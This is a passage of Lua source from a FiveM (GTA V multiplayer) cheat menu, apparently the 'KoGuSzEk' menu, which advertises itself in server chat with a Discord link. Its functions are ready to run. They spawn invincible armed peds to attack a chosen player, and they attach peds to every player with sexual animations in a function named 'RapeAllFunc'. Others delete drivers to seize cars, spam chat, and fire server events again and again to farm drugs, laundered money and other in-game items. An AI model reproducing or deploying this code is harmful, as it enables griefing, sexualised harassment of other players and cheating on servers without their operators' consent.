                    GetPedBoneIndex(GetPlayerPed(i), 57005),
                    0.4,
                    0,
                    0,
                    0,
                    270.0,
                    60.0,
                    true,
                    true,
                    false,
                    true,
                    1,
                    true
                )
                AttachEntityToEntity(
                    bI,
                    GetPlayerPed(i),
                    GetPedBoneIndex(GetPlayerPed(i), 57005),
                    0.4,
                    0,
                    0,
                    0,
                    270.0,
                    60.0,
                    true,
                    true,
                    false,
                    true,
                    1,
                    true
                )
                AttachEntityToEntity(
                    bJ,
                    GetPlayerPed(i),
                    GetPedBoneIndex(GetPlayerPed(i), 57005),
                    0.4,
                    0,
                    0,
                    0,
                    270.0,
                    60.0,
                    true,
                    true,
                    false,
                    true,
                    1,
                    true
                )
            end
        end
    )
end

function RespawnPed(ped, bK, bL)
    SetEntityCoordsNoOffset(ped, bK.x, bK.y, bK.z, false, false, false, true)
    NetworkResurrectLocalPlayer(bK.x, bK.y, bK.z, bL, true, false)
    SetPlayerInvincible(ped, false)
    TriggerServerEvent('playerSpawned', bK.x, bK.y, bK.z)
    ClearPedBloodDamage(ped)
end
local function bM(ad)
    local bN = NetworkGetNetworkIdFromEntity(ped)
    local bO = 0
    NetworkRequestControlOfNetworkId(bN)
    while not NetworkHasControlOfNetworkId(bN) do
        Citizen.Wait(1)
        NetworkRequestControlOfNetworkId(bN)
        bO = bO + 1
        if bO == 5000 then
            Citizen.Trace('Control failed')
            break
        end
    end
end
local function bP(bQ, bR)
    for i = 0, 10 do
        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
        pizda(GetHashKey(bQ))
        Citizen.Wait(50)
        if HasModelLoaded(GetHashKey(bQ)) then
            local ped =
                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z, 0, true, false) and
                CreatePed(21, GetHashKey(bQ), bK.x - i, bK.y + i, bK.z, 0, true, false)
            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                bM(ped)
                GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                SetEntityInvincible(ped, true)
                SetPedCanSwitchWeapon(ped, true)
                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
            else
                Citizen.Wait(0)
            end
        end
    end
end

function RapeAllFunc()
    --[[for bD = 0, 9 do
        TriggerServerEvent(
            '_chat:messageEntered',
            '^1A^2l^3p^4h^5a^6V^7e^1t^2a',
            {
                141,
                211,
                255
            },
            '^' .. bD .. 'You got raped by AlphaV'
        )
    end--]]
    Citizen.CreateThread(
        function()
            for i = 0, 128 do
                pizdaSync('a_m_o_acult_01')
                RequestAnimDict('rcmpaparazzo_2')
                while not HasAnimDictLoaded('rcmpaparazzo_2') do
                    Citizen.Wait(0)
                end
                if IsPedInAnyVehicle(GetPlayerPed(i), true) then
                    local veh = GetVehiclePedIsIn(GetPlayerPed(i), true)
                    while not NetworkHasControlOfEntity(veh) do
                        NetworkRequestControlOfEntity(veh)
                        Citizen.Wait(0)
                    end
                    SetEntityAsMissionEntity(veh, true, true)
                    DeleteVehicle(veh)
                    DeleteEntity(veh)
                end
                count = -0.2
                for b = 1, 3 do
                    local x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(i), true))
                    local bS = CreatePed(4, GetHashKey('a_m_o_acult_01'), x, y, z, 0.0, true, false)
                    SetEntityAsMissionEntity(bS, true, true)
                    AttachEntityToEntity(
                        bS,
                        GetPlayerPed(i),
                        4103,
                        11816,
                        count,
                        0.00,
                        0.0,
                        0.0,
                        0.0,
                        0.0,
                        false,
                        false,
                        false,
                        false,
                        2,
                        true
                    )
                    ClearPedTasks(GetPlayerPed(i))
                    TaskPlayAnim(GetPlayerPed(i), 'rcmpaparazzo_2', 'shag_loop_poppy', 2.0, 2.5, -1, 49, 0, 0, 0, 0)
                    SetPedKeepTask(bS)
                    TaskPlayAnim(bS, 'rcmpaparazzo_2', 'shag_loop_a', 2.0, 2.5, -1, 49, 0, 0, 0, 0)
                    SetEntityInvincible(bS, true)
                    count = count - 0.4
                end
            end
        end
    )
end
function chatspam()
                TriggerServerEvent(
                    '_chat:messageEntered',
                    'KoGuSzEk#3251',
                    {0, 0x99, 255},
                    '/ooc kogusz menu! Buy at https://discord.gg/QyRvc4d'
                )
                TriggerServerEvent('_chat:messageEntered', 'KoGuSzEk#3251', {0, 0x99, 255}, 'KoGuSzMENU <3 https://discord.gg/QyRvc4d')
            end
			
local function bT()
    local bU = KeyboardInput('Enter X pos', '', 100)
    local bV = KeyboardInput('Enter Y pos', '', 100)
    local bW = KeyboardInput('Enter Z pos', '', 100)
    if bU ~= '' and bV ~= '' and bW ~= '' then
        if
            IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
                GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)
         then
            entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
        else
            entity = GetPlayerPed(-1)
        end
        if entity then
            SetEntityCoords(entity, bU + 0.5, bV + 0.5, bW + 0.5, 1, 0, 0, 1)
            av('~g~Teleported to coords!', false)
        end
    else
        av('~w~Invalid coords!', true)
    end
end
local function bX()
    local name = KeyboardInput('Enter Blip Name', '', 100)
    if name == '' then
        av('~w~Invalid Blip Name!', true)
        return bX()
    else
        local bU = KeyboardInput('Enter X pos', '', 100)
        local bV = KeyboardInput('Enter Y pos', '', 100)
        local bW = KeyboardInput('Enter Z pos', '', 100)
        if bU ~= '' and bV ~= '' and bW ~= '' then
            local bY = {
                {
                    colour = 75,
                    id = 84
                }
            }
            for _, bZ in pairs(bY) do
                bZ.blip = AddBlipForCoord(bU + 0.5, bV + 0.5, bW + 0.5)
                SetBlipSprite(bZ.blip, bZ.id)
                SetBlipDisplay(bZ.blip, 4)
                SetBlipScale(bZ.blip, 0.9)
                SetBlipColour(bZ.blip, bZ.colour)
                SetBlipAsShortRange(bZ.blip, true)
                BeginTextCommandSetBlipName('STRING')
                AddTextComponentString(name)
                EndTextCommandSetBlipName(bZ.blip)
            end
        else
            av('~w~Invalid coords!', true)
        end
    end
end

local function b_()
    local ax = GetPlayerPed(-1)
    local c0 = GetEntityCoords(ax, true)
    local c1 = GetClosestVehicle(GetEntityCoords(ax, true), 1000.0, 0, 4)
    local c2 = GetEntityCoords(c1, true)
    local c3 = GetClosestVehicle(GetEntityCoords(ax, true), 1000.0, 0, 16384)
    local c4 = GetEntityCoords(c3, true)
    av('~y~Wait...', false)
    Citizen.Wait(1000)
    if c1 == 0 and c3 == 0 then
        av('~w~No Vehicle Found', true)
    elseif c1 == 0 and c3 ~= 0 then
        if IsVehicleSeatFree(c3, -1) then
            SetPedIntoVehicle(ax, c3, -1)
            SetVehicleAlarm(c3, false)
            SetVehicleDoorsLocked(c3, 1)
            SetVehicleNeedsToBeHotwired(c3, false)
        else
            local c5 = GetPedInVehicleSeat(c3, -1)
            ClearPedTasksImmediately(c5)
            SetEntityAsMissionEntity(c5, 1, 1)
            DeleteEntity(c5)
            SetPedIntoVehicle(ax, c3, -1)
            SetVehicleAlarm(c3, false)
            SetVehicleDoorsLocked(c3, 1)
            SetVehicleNeedsToBeHotwired(c3, false)
        end
        av('~g~Teleported Into Nearest Vehicle!', false)
    elseif c1 ~= 0 and c3 == 0 then
        if IsVehicleSeatFree(c1, -1) then
            SetPedIntoVehicle(ax, c1, -1)
            SetVehicleAlarm(c1, false)
            SetVehicleDoorsLocked(c1, 1)
            SetVehicleNeedsToBeHotwired(c1, false)
        else
            local c5 = GetPedInVehicleSeat(c1, -1)
            ClearPedTasksImmediately(c5)
            SetEntityAsMissionEntity(c5, 1, 1)
            DeleteEntity(c5)
            SetPedIntoVehicle(ax, c1, -1)
            SetVehicleAlarm(c1, false)
            SetVehicleDoorsLocked(c1, 1)
            SetVehicleNeedsToBeHotwired(c1, false)
        end
        av('~g~Teleported Into Nearest Vehicle!', false)
    elseif c1 ~= 0 and c3 ~= 0 then
        if Vdist(c2.x, c2.y, c2.z, c0.x, c0.y, c0.z) < Vdist(c4.x, c4.y, c4.z, c0.x, c0.y, c0.z) then
            if IsVehicleSeatFree(c1, -1) then
                SetPedIntoVehicle(ax, c1, -1)
                SetVehicleAlarm(c1, false)
                SetVehicleDoorsLocked(c1, 1)
                SetVehicleNeedsToBeHotwired(c1, false)
            else
                local c5 = GetPedInVehicleSeat(c1, -1)
                ClearPedTasksImmediately(c5)
                SetEntityAsMissionEntity(c5, 1, 1)
                DeleteEntity(c5)
                SetPedIntoVehicle(ax, c1, -1)
                SetVehicleAlarm(c1, false)
                SetVehicleDoorsLocked(c1, 1)
                SetVehicleNeedsToBeHotwired(c1, false)
            end
        elseif Vdist(c2.x, c2.y, c2.z, c0.x, c0.y, c0.z) > Vdist(c4.x, c4.y, c4.z, c0.x, c0.y, c0.z) then
            if IsVehicleSeatFree(c3, -1) then
                SetPedIntoVehicle(ax, c3, -1)
                SetVehicleAlarm(c3, false)
                SetVehicleDoorsLocked(c3, 1)
                SetVehicleNeedsToBeHotwired(c3, false)
            else
                local c5 = GetPedInVehicleSeat(c3, -1)
                ClearPedTasksImmediately(c5)
                SetEntityAsMissionEntity(c5, 1, 1)
                DeleteEntity(c5)
                SetPedIntoVehicle(ax, c3, -1)
                SetVehicleAlarm(c3, false)
                SetVehicleDoorsLocked(c3, 1)
                SetVehicleNeedsToBeHotwired(c3, false)
            end
        end
        av('~g~Teleported Into Nearest Vehicle!', false)
    end
end
local function c6()
    if DoesBlipExist(GetFirstBlipInfoId(8)) then
        local c7 = GetBlipInfoIdIterator(8)
        local blip = GetFirstBlipInfoId(8, c7)
        WaypointCoords = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector())
        wp = true
    else
        av('~w~No waypoint!', true)
    end
    local c8 = 0.0
    height = 1000.0
    while wp do
        Citizen.Wait(0)
        if wp then
            if
                IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
                    GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)
             then
                entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
            else
                entity = GetPlayerPed(-1)
            end
            SetEntityCoords(entity, WaypointCoords.x, WaypointCoords.y, height)
            FreezeEntityPosition(entity, true)
            local c9 = GetEntityCoords(entity, true)
            if c8 == 0.0 then
                height = height - 25.0
                SetEntityCoords(entity, c9.x, c9.y, height)
                bool, c8 = GetGroundZFor_3dCoord(c9.x, c9.y, c9.z, 0)
            else
                SetEntityCoords(entity, c9.x, c9.y, c8)
                FreezeEntityPosition(entity, false)
                wp = false
                height = 1000.0
                c8 = 0.0
                av('~g~Teleported to waypoint!', false)
                break
            end
        end
    end
end
local function ca()
    local cb = KeyboardInput('Enter Vehicle Spawn Name', '', 100)
    if cb and IsModelValid(cb) and IsModelAVehicle(cb) then
        pizda(cb)
        while not HasModelLoaded(cb) do
            Citizen.Wait(0)
        end
        local veh =
            CreateVehicle(
            GetHashKey(cb),
            GetEntityCoords(PlayerPedId(-1)),
            GetEntityHeading(PlayerPedId(-1)),
            true,
            true
        )
        SetPedIntoVehicle(PlayerPedId(-1), veh, -1)
    else
        av('~w~~h~Model is not valid!', true)
    end
end
local function cc()
    SetVehicleFixed(GetVehiclePedIsIn(GetPlayerPed(-1), false))
    SetVehicleDirtLevel(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0.0)
    SetVehicleLights(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
    SetVehicleBurnout(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
    Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
    SetVehicleUndriveable(vehicle, false)
end
local function cd()
    SetVehicleEngineHealth(vehicle, 1000)
    Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
    SetVehicleUndriveable(vehicle, false)
end
local function ce()
    KoGuSzEk.StartRC()
end
KoGuSzEk.StartRC = function()
    if DoesEntityExist(KoGuSzEk.Entity) then
        return
    end
    KoGuSzEk.SpawnRC()
    KoGuSzEk.Tablet(true)
    while DoesEntityExist(KoGuSzEk.Entity) and DoesEntityExist(KoGuSzEk.Driver) do
        Citizen.Wait(5)
        local cf = GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), GetEntityCoords(KoGuSzEk.Entity), true)
        KoGuSzEk.DrawInstructions(cf)
        KoGuSzEk.HandleKeys(cf)
        if cf <= 3000.0 then
            if not NetworkHasControlOfEntity(KoGuSzEk.Driver) then
                NetworkRequestControlOfEntity(KoGuSzEk.Driver)
            elseif not NetworkHasControlOfEntity(KoGuSzEk.Entity) then
                NetworkRequestControlOfEntity(KoGuSzEk.Entity)
            end
        else
            TaskVehicleTempAction(KoGuSzEk.Driver, KoGuSzEk.Entity, 6, 2500)
        end
    end
end
KoGuSzEk.HandleKeys = function(cf)
    if IsControlJustReleased(0, 47) then
        if IsCamRendering(KoGuSzEk.cmera) then
            KoGuSzEk.ToggleCamera(false)
        else
            KoGuSzEk.ToggleCamera(true)
        end
    end
    if cf <= 3.0 then
        if IsControlJustPressed(0, 38) then
            KoGuSzEk.Attach('pick')
        end
    end
    if cf < 3000.0 then
        if IsControlPressed(0, 172) and not IsControlPressed(0, 173) then
            TaskVehicleTempAction(KoGuSzEk.Driver, KoGuSzEk.Entity, 9, 1)
        end
        if IsControlJustReleased(0, 172) or IsControlJustReleased(0, 173) then
            TaskVehicleTempAction(KoGuSzEk.Driver, KoGuSzEk.Entity, 6, 2500)
        end
        if IsControlPressed(0, 173) and not IsControlPressed(0, 172) then
            TaskVehicleTempAction(KoGuSzEk.Driver, KoGuSzEk.Entity, 22, 1)
        end
        if IsControlPressed(0, 174) and IsControlPressed(0, 173) then
            TaskVehicleTempAction(KoGuSzEk.Driver, KoGuSzEk.Entity, 13, 1)
        end
        if IsControlPressed(0, 175) and IsControlPressed(0, 173) then
            TaskVehicleTempAction(KoGuSzEk.Driver, KoGuSzEk.Entity, 14, 1)
        end
        if IsControlPressed(0, 172) and IsControlPressed(0, 173) then
            TaskVehicleTempAction(KoGuSzEk.Driver, KoGuSzEk.Entity, 30, 100)
        end
        if IsControlPressed(0, 174) and IsControlPressed(0, 172) then
            TaskVehicleTempAction(KoGuSzEk.Driver, KoGuSzEk.Entity, 7, 1)
        end
        if IsControlPressed(0, 175) and IsControlPressed(0, 172) then
            TaskVehicleTempAction(KoGuSzEk.Driver, KoGuSzEk.Entity, 8, 1)
        end
        if IsControlPressed(0, 174) and not IsControlPressed(0, 172) and not IsControlPressed(0, 173) then
            TaskVehicleTempAction(KoGuSzEk.Driver, KoGuSzEk.Entity, 4, 1)
        end
        if IsControlPressed(0, 175) and not IsControlPressed(0, 172) and not IsControlPressed(0, 173) then
            TaskVehicleTempAction(KoGuSzEk.Driver, KoGuSzEk.Entity, 5, 1)
        end
        if IsControlJustReleased(0, 168) then
            SetVehicleEngineOn(KoGuSzEk.Entity, not GetIsVehicleEngineRunning(KoGuSzEk.Entity), false, true)
        end
    end
end
KoGuSzEk.DrawInstructions = function(cf)
    local cg = {
        {
            ['label'] = 'Right',
            ['button'] = '~INPUT_CELLPHONE_RIGHT~'
        },
        {
            ['label'] = 'Forward',
            ['button'] = '~INPUT_CELLPHONE_UP~'
        },
        {
            ['label'] = 'Reverse',
            ['button'] = '~INPUT_CELLPHONE_DOWN~'
        },
        {
            ['label'] = 'Left',
            ['button'] = '~INPUT_CELLPHONE_LEFT~'
        }
    }
    local ch = {
        ['label'] = 'Delete Car',
        ['button'] = '~INPUT_CONTEXT~'
    }
    local cj = {
        {
            ['label'] = 'Toggle Camera',
            ['button'] = '~INPUT_DETONATE~'
        },
        {
            ['label'] = 'Start/Stop Engine',
            ['button'] = '~INPUT_SELECT_CHARACTER_TREVOR~'
        }
    }
    if cf <= 3000.0 then
        for ck = 1, #cg do
            local cl = cg[ck]
            table.insert(cj, cl)
        end
        if cf <= 3000.0 then
            table.insert(cj, ch)
        end
    end
    Citizen.CreateThread(
        function()
            local cm = RequestScaleformMovie('instructional_buttons')
            while not HasScaleformMovieLoaded(cm) do
                Wait(0)
            end
            PushScaleformMovieFunction(cm, 'CLEAR_ALL')
            PushScaleformMovieFunction(cm, 'TOGGLE_MOUSE_BUTTONS')
            PushScaleformMovieFunctionParameterBool(0)
            PopScaleformMovieFunctionVoid()
            for ck, cn in ipairs(cj) do
                PushScaleformMovieFunction(cm, 'SET_DATA_SLOT')
                PushScaleformMovieFunctionParameterInt(ck - 1)
                PushScaleformMovieMethodParameterButtonName(cn['button'])
                PushScaleformMovieFunctionParameterString(cn['label'])
                PopScaleformMovieFunctionVoid()
            end
            PushScaleformMovieFunction(cm, 'DRAW_INSTRUCTIONAL_BUTTONS')
            PushScaleformMovieFunctionParameterInt(-1)
            PopScaleformMovieFunctionVoid()
            DrawScaleformMovieFullscreen(cm, 255, 255, 255, 255)
        end
    )
end
KoGuSzEk.SpawnRC = function()
    local cb = KeyboardInput('Enter Vehicle Spawn Name', '', 100)
    if cb and IsModelValid(cb) and IsModelAVehicle(cb) then
        pizda(cb)
        while not HasModelLoaded(cb) do
            Citizen.Wait(0)
        end
        KoGuSzEk.LoadModels(
            {
                GetHashKey(cb),
                68070371
            }
        )
        local co, cp =
            GetEntityCoords(PlayerPedId()) + GetEntityForwardVector(PlayerPedId()) * 2.0,
            GetEntityHeading(PlayerPedId())
        KoGuSzEk.Entity = CreateVehicle(GetHashKey(cb), co, cp, true)
        while not DoesEntityExist(KoGuSzEk.Entity) do
            Citizen.Wait(5)
        end
        KoGuSzEk.Driver = CreatePed(5, 68070371, co, cp, true)
        SetEntityInvincible(KoGuSzEk.Driver, true)
        SetEntityVisible(KoGuSzEk.Driver, false)
        FreezeEntityPosition(KoGuSzEk.Driver, true)
        SetPedAlertness(KoGuSzEk.Driver, 0.0)
        TaskWarpPedIntoVehicle(KoGuSzEk.Driver, KoGuSzEk.Entity, -1)
        while not IsPedInVehicle(KoGuSzEk.Driver, KoGuSzEk.Entity) do
            Citizen.Wait(0)
        end
        KoGuSzEk.Attach('place')
        av('~g~~h~Success', false)
    else
        av('~w~~h~Model is not valid !', true)
    end
end
KoGuSzEk.Attach = function(aw)
    if not DoesEntityExist(KoGuSzEk.Entity) then
        return
    end
    KoGuSzEk.LoadModels(
        {
            'pickup_object'
        }
    )
    if aw == 'place' then
        AttachEntityToEntity(
            KoGuSzEk.Entity,
            PlayerPedId(),
            GetPedBoneIndex(PlayerPedId(), 28422),
            3.0,
            0.0,
            0.5,
            70.0,
            0.0,
            270.0,
            1,
            1,
            0,
            0,
            2,
            1
        )
        Citizen.Wait(200)
        DetachEntity(KoGuSzEk.Entity, false, true)
        PlaceObjectOnGroundProperly(KoGuSzEk.Entity)
    elseif aw == 'pick' then
        if DoesCamExist(KoGuSzEk.cmera) then
            KoGuSzEk.ToggleCamera(false)
        end
        KoGuSzEk.Tablet(false)
        Citizen.Wait(100)
        DetachEntity(KoGuSzEk.Entity)
        DeleteVehicle(KoGuSzEk.Entity)
        DeleteEntity(KoGuSzEk.Driver)
        KoGuSzEk.UnloadModels()
    end
end
KoGuSzEk.Tablet = function(cq)
    if cq then
        KoGuSzEk.LoadModels(
            {
                GetHashKey('prop_cs_tablet')
            }
        )
        KoGuSzEk.LoadModels(
            {
                'amb@code_human_in_bus_passenger_idles@female@tablet@idle_a'
            }
        )
        Citizen.CreateThread(
            function()
                while DoesEntityExist(KoGuSzEk.TabletEntity) do
                    Citizen.Wait(5)
                    if
                        not IsEntityPlayingAnim(
                            PlayerPedId(),
                            'amb@code_human_in_bus_passenger_idles@female@tablet@idle_a',
                            'idle_a',
                            3
                        )
                     then
                    end
                end
                ClearPedTasks(PlayerPedId())
            end
        )
    else
        DeleteEntity(KoGuSzEk.TabletEntity)
    end
end
KoGuSzEk.ToggleCamera = function(cq)
    if not true then
        return
    end
    if cq then
        if not DoesEntityExist(KoGuSzEk.Entity) then
            return
        end
        if DoesCamExist(KoGuSzEk.cmera) then
            DestroyCam(KoGuSzEk.cmera)
        end
        KoGuSzEk.cmera = CreateCam('DEFAULT_SCRIPTED_CAMERA', true)
        AttachCamToEntity(KoGuSzEk.cmera, KoGuSzEk.Entity, 0.0, 0.0, 0.4, true)
        Citizen.CreateThread(
            function()
                while DoesCamExist(KoGuSzEk.cmera) do
                    Citizen.Wait(5)
                    SetCamRot(KoGuSzEk.cmera, GetEntityRotation(KoGuSzEk.Entity))
                end
            end
        )
        local cr =
            500 *
            math.ceil(
                GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), GetEntityCoords(KoGuSzEk.Entity), true) / 10
            )
        RenderScriptCams(1, 1, cr, 1, 1)
        Citizen.Wait(cr)
        SetTimecycleModifier('scanline_cam_cheap')
        SetTimecycleModifierStrength(2.0)
    else
        local cr =
            500 *
            math.ceil(
                GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), GetEntityCoords(KoGuSzEk.Entity), true) / 10
            )
        RenderScriptCams(0, 1, cr, 1, 0)
        Citizen.Wait(cr)
        ClearTimecycleModifier()
        DestroyCam(KoGuSzEk.cmera)
    end
end
KoGuSzEk.LoadModels = function(cs)
    for ct = 1, #cs do
        local bB = cs[ct]
        if not KoGuSzEk.cchedModels then
            KoGuSzEk.cchedModels = {}
        end
        table.insert(KoGuSzEk.cchedModels, bB)
        if IsModelValid(bB) then
            while not HasModelLoaded(bB) do
                pizda(bB)
                Citizen.Wait(10)
            end
        else
            while not HasAnimDictLoaded(bB) do
                RequestAnimDict(bB)
                Citizen.Wait(10)
            end
        end
    end
end
KoGuSzEk.UnloadModels = function()
    for ct = 1, #KoGuSzEk.cchedModels do
        local bB = KoGuSzEk.cchedModels[ct]
        if IsModelValid(bB) then
            SetModelAsNoLongerNeeded(bB)
        else
            RemoveAnimDict(bB)
        end
    end
end
local function cu()
    local ax = GetPlayerPed(-1)
    local ay = GetVehiclePedIsIn(ax, true)
    local m = KeyboardInput('Enter the plate license you want', '', 100)
    if m ~= '' then
        SetVehicleNumberPlateText(ay, m)
    end
end

function pickupcannabis()
    TriggerServerEvent('esx_drugs:pickedUpCannabis')
    TriggerServerEvent('esx_drugs:pickedUpCannabis')
    TriggerServerEvent('esx_drugs:pickedUpCannabis')
    TriggerServerEvent('esx_drugs:pickedUpCannabis')
end

function proccesscannabis()
    TriggerServerEvent('esx_drugs:processCannabis')
end

function hweed()
    TriggerServerEvent('esx_drugs:startHarvestWeed')
    TriggerServerEvent('esx_drugs:startHarvestWeed')
    TriggerServerEvent('esx_drugs:startHarvestWeed')
    TriggerServerEvent('esx_drugs:startHarvestWeed')
    TriggerServerEvent('esx_illegal_drugs:startHarvestWeed')
    TriggerServerEvent('esx_illegal_drugs:startHarvestWeed')
    TriggerServerEvent('esx_illegal_drugs:startHarvestWeed')
    TriggerServerEvent('esx_illegal_drugs:startHarvestWeed')
end

function tweed()
    TriggerServerEvent('esx_drugs:startTransformWeed')
    TriggerServerEvent('esx_drugs:startTransformWeed')
    TriggerServerEvent('esx_drugs:startTransformWeed')
    TriggerServerEvent('esx_drugs:startTransformWeed')
    TriggerServerEvent('esx_illegal_drugs:startTransformWeed')
    TriggerServerEvent('esx_illegal_drugs:startTransformWeed')
    TriggerServerEvent('esx_illegal_drugs:startTransformWeed')
    TriggerServerEvent('esx_illegal_drugs:startTransformWeed')
end

function sweed()
    TriggerServerEvent('esx_drugs:startSellWeed')
    TriggerServerEvent('esx_drugs:startSellWeed')
    TriggerServerEvent('esx_drugs:startSellWeed')
    TriggerServerEvent('esx_drugs:startSellWeed')
    TriggerServerEvent('esx_illegal_drugs:startSellWeed')
    TriggerServerEvent('esx_illegal_drugs:startSellWeed')
    TriggerServerEvent('esx_illegal_drugs:startSellWeed')
    TriggerServerEvent('esx_illegal_drugs:startSellWeed')
end

function hcoke()
    TriggerServerEvent('esx_drugs:startHarvestCoke')
    TriggerServerEvent('esx_drugs:startHarvestCoke')
    TriggerServerEvent('esx_drugs:startHarvestCoke')
    TriggerServerEvent('esx_drugs:startHarvestCoke')
    TriggerServerEvent('esx_illegal_drugs:startHarvestCoke')
    TriggerServerEvent('esx_illegal_drugs:startHarvestCoke')
    TriggerServerEvent('esx_illegal_drugs:startHarvestCoke')
    TriggerServerEvent('esx_illegal_drugs:startHarvestCoke')
end

function tcoke()
    TriggerServerEvent('esx_drugs:startTransformCoke')
    TriggerServerEvent('esx_drugs:startTransformCoke')
    TriggerServerEvent('esx_drugs:startTransformCoke')
    TriggerServerEvent('esx_drugs:startTransformCoke')
    TriggerServerEvent('esx_illegal_drugs:startTransformCoke')
    TriggerServerEvent('esx_illegal_drugs:startTransformCoke')
    TriggerServerEvent('esx_illegal_drugs:startTransformCoke')
    TriggerServerEvent('esx_illegal_drugs:startTransformCoke')
end

function scoke()
    TriggerServerEvent('esx_drugs:startSellCoke')
    TriggerServerEvent('esx_drugs:startSellCoke')
    TriggerServerEvent('esx_drugs:startSellCoke')
    TriggerServerEvent('esx_drugs:startSellCoke')
    TriggerServerEvent('esx_illegal_drugs:startSellCoke')
    TriggerServerEvent('esx_illegal_drugs:startSellCoke')
    TriggerServerEvent('esx_illegal_drugs:startSellCoke')
    TriggerServerEvent('esx_illegal_drugs:startSellCoke')
end

function hmeth()
    TriggerServerEvent('esx_drugs:startHarvestMeth')
    TriggerServerEvent('esx_drugs:startHarvestMeth')
    TriggerServerEvent('esx_drugs:startHarvestMeth')
    TriggerServerEvent('esx_drugs:startHarvestMeth')
    TriggerServerEvent('esx_illegal_drugs:startHarvestMeth')
    TriggerServerEvent('esx_illegal_drugs:startHarvestMeth')
    TriggerServerEvent('esx_illegal_drugs:startHarvestMeth')
    TriggerServerEvent('esx_illegal_drugs:startHarvestMeth')
    TriggerServerEvent('MF_MobileMeth:RewardPlayers')
end

function tmeth()
    TriggerServerEvent('esx_drugs:startTransformMeth')
    TriggerServerEvent('esx_drugs:startTransformMeth')
    TriggerServerEvent('esx_drugs:startTransformMeth')
    TriggerServerEvent('esx_drugs:startTransformMeth')
    TriggerServerEvent('esx_illegal_drugs:startTransformMeth')
    TriggerServerEvent('esx_illegal_drugs:startTransformMeth')
    TriggerServerEvent('esx_illegal_drugs:startTransformMeth')
    TriggerServerEvent('esx_illegal_drugs:startTransformMeth')
end

function smeth()
    TriggerServerEvent('esx_drugs:startSellMeth')
    TriggerServerEvent('esx_drugs:startSellMeth')
    TriggerServerEvent('esx_drugs:startSellMeth')
    TriggerServerEvent('esx_drugs:startSellMeth')
    TriggerServerEvent('esx_illegal_drugs:startSellMeth')
    TriggerServerEvent('esx_illegal_drugs:startSellMeth')
    TriggerServerEvent('esx_illegal_drugs:startSellMeth')
    TriggerServerEvent('esx_illegal_drugs:startSellMeth')
end

function hopi()
    TriggerServerEvent('esx_drugs:startHarvestOpium')
    TriggerServerEvent('esx_drugs:startHarvestOpium')
    TriggerServerEvent('esx_drugs:startHarvestOpium')
    TriggerServerEvent('esx_drugs:startHarvestOpium')
    TriggerServerEvent('esx_illegal_drugs:startHarvestOpium')
    TriggerServerEvent('esx_illegal_drugs:startHarvestOpium')
    TriggerServerEvent('esx_illegal_drugs:startHarvestOpium')
    TriggerServerEvent('esx_illegal_drugs:startHarvestOpium')
end

function topi()
    TriggerServerEvent('esx_drugs:startTransformOpium')
    TriggerServerEvent('esx_drugs:startTransformOpium')
    TriggerServerEvent('esx_drugs:startTransformOpium')
    TriggerServerEvent('esx_drugs:startTransformOpium')
    TriggerServerEvent('esx_illegal_drugs:startTransformOpium')
    TriggerServerEvent('esx_illegal_drugs:startTransformOpium')
    TriggerServerEvent('esx_illegal_drugs:startTransformOpium')
    TriggerServerEvent('esx_illegal_drugs:startTransformOpium')
end

function sopi()
    TriggerServerEvent('esx_drugs:startSellOpium')
    TriggerServerEvent('esx_drugs:startSellOpium')
    TriggerServerEvent('esx_drugs:startSellOpium')
    TriggerServerEvent('esx_drugs:startSellOpium')
    TriggerServerEvent('esx_illegal_drugs:startSellOpium')
    TriggerServerEvent('esx_illegal_drugs:startSellOpium')
    TriggerServerEvent('esx_illegal_drugs:startSellOpium')
    TriggerServerEvent('esx_illegal_drugs:startSellOpium')
end

function snpc()
    TriggerServerEvent('sellDrugs')
end

function mataaspalarufe()
    TriggerServerEvent('esx_blanchisseur:startWhitening', 85)
    TriggerServerEvent('esx_blanchisseur:washMoney', 100)
    TriggerServerEvent('esx_blackmoney:washMoney')
    TriggerServerEvent('esx_moneywash:withdraw', 100)
    TriggerServerEvent('laundry:washcash')
end

function harvestbitcoin()
    TriggerServerEvent('esx_bitcoin:startHarvestKoda')
    TriggerServerEvent('esx_bitcoin:startHarvestKoda')
    TriggerServerEvent('esx_bitcoin:startHarvestKoda')
    TriggerServerEvent('esx_bitcoin:startHarvestKoda')
end

function sellbitcoin()
    TriggerServerEvent('esx_bitcoin:startSellKoda')
    TriggerServerEvent('esx_bitcoin:startSellKoda')
    TriggerServerEvent('esx_bitcoin:startSellKoda')
    TriggerServerEvent('esx_bitcoin:startSellKoda')
end

function harvestgazbottle()
    TriggerServerEvent('esx_mechanicjob:startHarvest')
    TriggerServerEvent('esx_mechanicjob:startHarvest')
    TriggerServerEvent('esx_mechanicjob:startHarvest')
    TriggerServerEvent('esx_mechanicjob:startHarvest')
end

function craftgazbottle()
    TriggerServerEvent('esx_mechanicjob:startCraft')
    TriggerServerEvent('esx_mechanicjob:startCraft')
    TriggerServerEvent('esx_mechanicjob:startCraft')
    TriggerServerEvent('esx_mechanicjob:startCraft')
end

function harvestrepairkits()
